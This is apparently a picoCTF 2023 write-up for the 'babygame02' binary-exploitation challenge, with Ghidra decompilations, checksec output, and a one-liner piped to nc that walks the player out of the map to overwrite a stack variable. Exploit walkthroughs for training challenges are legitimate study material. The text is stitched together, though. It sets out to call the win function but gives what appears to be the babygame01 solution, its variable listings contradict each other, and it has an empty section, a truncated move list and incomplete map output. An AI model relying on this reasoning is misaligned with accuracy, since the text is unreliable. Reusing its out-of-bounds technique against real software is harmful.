# babygame02

- [Challenge information](babygame02.md#challenge-information)
- [Solution](babygame02.md#solution)
  - [Analyse the file](babygame02.md#analyse-the-file)
  - [Do a test run](babygame02.md#do-a-test-run)
  - [Write an exploit](babygame02.md#write-an-exploit)
  - [Get the flag](babygame02.md#get-the-flag)

## Challenge information
```
Points: 200
Tags: picoCTF 2023, Binary Expoitation, game
Author: PALASH OSWAL

Description:

Break the game and get the flag.

Welcome to BabyGame 02! Navigate around the map and see what you can find! 

The game is available to download here. There is no source available, so you'll have to figure your way around the map. 

You can connect with it using nc saturn.picoctf.net 55907.
 
Hints:
1. Use 'w','a','s','d' to move around.
2. There may be secret commands to make your life easy.
```

## Solution

This is a some what harder version of the [previous game](babygame01.md).

### Analyse the file

Lets start by analysis the file with `file` and `checksec`
```
┌──(kali㉿kali)-[/picoCTF/picoCTF_2023/Binary_Exploitation/babygame02]
└─$ file game                               
game: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5f29108993130175bf5911883fc8a0538cf9a9fd, for GNU/Linux 3.2.0, not stripped

┌──(kali㉿kali)-[/picoCTF/picoCTF_2023/Binary_Exploitation/babygame02]
└─$ checksec --file=game
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   58 Symbols        No    0               2               game
```

Then import the file in [Ghidra](https://ghidra-sre.org/) and analyze it with the default settings.  
Double-click on the `main` function to show the decompiled version of it.
```c
undefined4 main(void)

{
  int iVar1;
  int local_aa8;
  int local_aa4;
  undefined local_a9d [2700];
  char local_11;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  init_player(&local_aa8);
  init_map(local_a9d,&local_aa8);
  print_map(local_a9d,&local_aa8);
  signal(2,sigint_handler);
  do {
    do {
      iVar1 = getchar();
      local_11 = (char)iVar1;
      move_player(&local_aa8,(int)local_11,local_a9d);
      print_map(local_a9d,&local_aa8);
    } while (local_aa8 != 0x1d);
  } while (local_aa4 != 0x59);
  puts("You win!");
  return 0;
}
```

Looking through the function you can see the flag is never printed!

Continuing looking through the functions in Ghidra there is also a `win` function
```c
void win(void)

{
  char local_4c [60];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("flag.txt not found in current directory");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_4c,0x3c,local_10);
  printf(local_4c);
  return;
}
```

We need to call this `win` function ourselves somehow.

Lets also check the `move_player` function which is identical to the previous game.
```c
void move_player(int *param_1,char param_2,int param_3)

{
  int iVar1;
  
  if (param_2 == 'l') {
    iVar1 = getchar();
    player_tile = (undefined)iVar1;
  }
  if (param_2 == 'p') {
    solve_round(param_3,param_1);
  }
  *(undefined *)(*param_1 * 0x5a + param_3 + param_1[1]) = 0x2e;
  if (param_2 == 'w') {
    *param_1 = *param_1 + -1;
  }
  else if (param_2 == 's') {
    *param_1 = *param_1 + 1;
  }
  else if (param_2 == 'a') {
    param_1[1] = param_1[1] + -1;
  }
  else if (param_2 == 'd') {
    param_1[1] = param_1[1] + 1;
  }
  *(undefined *)(*param_1 * 0x5a + param_3 + param_1[1]) = player_tile;
  return;
}
```

Note especially the `l` command which let you change your "character sign" from the '@' sign to any character you specify.
This will come in handy later.

### Analyze the stack setup for the `move_player` function



Then run the game locally
```
┌──(kali㉿kali)-[/picoCTF/picoCTF_2023/Binary_Exploitation/babygame01]
└─$ ./game 

Player position: 4 4
End tile position: 29 89
Player has flag: 0
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................

..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X
```

On the map you are the '@' sign and 'X' in the lower right corner is where you should move to.
As before you can move
 * Up with 'w'

With 'p' you move "automatically" to the lover right corner with one command.  
However, no flag is printed when you use it as the local variable isn't changed yet.
```
Player position: 29 89
Player has flag: 0
..........................................................................................

..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................@
You win!
```

### Write an exploit

So how can we change the local variable `local_aa4` to a non-zero value?  
Lets look at the allocation of variables again

```c
<---snip--->
  int iVar1;
  undefined4 uVar2;
  int in_GS_OFFSET;
  int local_aac;
  int local_aa8;
  char local_aa4;
  undefined local_aa0 [2700];
  int local_14;
  undefined *local_10;
<---snip--->
```

The lower right corner of the map is position `29 89` so the variable `local_aa0` of size 2700 bytes ought to be the map.
And the local variable we want to change is allocated just before that.

What if you can navigate outside of the map and use our '@' sign to change the `local_aa4` variable?

Looking at the starting position on the map we see that we need to move up 4 times (i.e. 4 * 'w') and at least 5 times to the left until the helpful `Player has flag` indicator is changed.

Trying this out we see that we need to move 8 times to the left until the flag indicator is changed.
```
End tile position: 29 89
Player has flag: 64
```

To summarize, our "exploit" consists of
 * 4 * 'w' for 4 upwards moves
 * 8 * 'a' for 8 moves to the left and then
 * 'p' to move to the X

### Get the flag

Finally, lets send our tiny exploit to the server to get the flag
```
┌──(kali㉿kali)-[/picoCTF/picoCTF_2023/Binary_Exploitation/babygame01]
└─$ python -c "print('w'*4 + 'a'*8 + 'p')" | nc saturn.picoctf.net 60968

<--- snip --->

Player position: 29 89
Player has flag: 46
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................@
You win!
flage
picoCTF{<REDACTED>}
```
